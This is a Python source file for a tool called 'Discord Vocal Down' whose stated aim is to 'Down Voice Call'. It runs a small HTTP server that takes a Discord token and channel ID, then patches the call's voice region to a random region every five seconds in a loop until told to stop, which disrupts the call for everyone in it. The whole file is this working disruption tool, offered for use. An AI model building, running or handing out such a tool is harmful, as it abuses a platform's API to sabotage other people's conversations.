from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import requests
import random
import threading

__app__ = "Discord Vocal Down"
__description__ = "A simple application which allows you to Down Voice Call By ErrorNoName/Ezio"
__version__ = "v1.0"
__author__ = "ErrorNoName"

# Configuration
REGIONS = [
    'us-west', 'us-east', 'us-central', 'us-south', 'singapore', 'southafrica',
    'sydney', 'rotterdam', 'brazil', 'hongkong', 'russia', 'japan', 'india', 'south-korea'
]

# Variables globales pour gérer l'arrêt du script
stop_threads = False
thread_lock = threading.Lock()
current_thread = None

class VocalChannelManager(BaseHTTPRequestHandler):

    def respond_with_html(self, html):
        """Respond with HTML content."""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def respond_with_json(self, data, status=200):
        """Respond with JSON content."""
        self.send_response(status)
        # Ajouter les en-têtes CORS
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def hop_regions(self, token, channel_id):
        """Change the voice channel region in a loop."""
        global stop_threads
        session = requests.Session()

        while not stop_threads:
            response = session.patch(
                f"https://discord.com/api/v9/channels/{channel_id}/call",
                json={"region": random.choice(REGIONS)},
                headers={"authorization": token, "user-agent": "VocalChannelManager"}
            )
            if response.status_code == 204:
                print("Région changée avec succès.")
            else:
                print("Erreur lors du changement de région.")
            # Attendre un certain temps avant de changer à nouveau la région
            # Par exemple, 5 secondes. Ajustez selon vos besoins.
            threading.Event().wait(5)

    def do_OPTIONS(self):
        """Handle OPTIONS requests for CORS."""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_GET(self):
        """Handle GET requests."""
        # Si vous souhaitez servir le frontend via le backend, vous pouvez intégrer index.html ici
        # Sinon, servir une réponse par défaut
        self.respond_with_html("Bienvenue sur Discord Vocal Down API. Utilisez l'interface frontend pour interagir.")

    def do_POST(self):
        """Handle POST requests."""
        global stop_threads
        global current_thread

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        try:
            data = json.loads(post_data)
        except json.JSONDecodeError:
            self.respond_with_json({"error": "Données JSON invalides."}, status=400)
            return

        action = data.get('action')
        token = data.get('token')
        channel_id = data.get('channel_id')

        if action == "start":
            if not token or not channel_id:
                self.respond_with_json({"error": "Token et Channel ID sont requis."}, status=400)
                return

            with thread_lock:
                if current_thread and current_thread.is_alive():
                    self.respond_with_json({"error": "Le changement de région est déjà en cours."}, status=400)
                    return
                else:
                    stop_threads = False
                    current_thread = threading.Thread(target=self.hop_regions, args=(token, channel_id), daemon=True)
                    current_thread.start()
                    self.respond_with_json({"message": "Le changement de région a commencé."})
        elif action == "stop":
            with thread_lock:
                if current_thread and current_thread.is_alive():
                    stop_threads = True
                    current_thread.join()
                    self.respond_with_json({"message": "Le changement de région a été arrêté."})
                else:
                    self.respond_with_json({"error": "Le changement de région n'est pas en cours."}, status=400)
        else:
            self.respond_with_json({"error": "Action invalide."}, status=400)

def run(server_class=HTTPServer, handler_class=VocalChannelManager, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting {__app__} on port {port}...')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print(f'\nStopping {__app__}.')

if __name__ == '__main__':
    run()
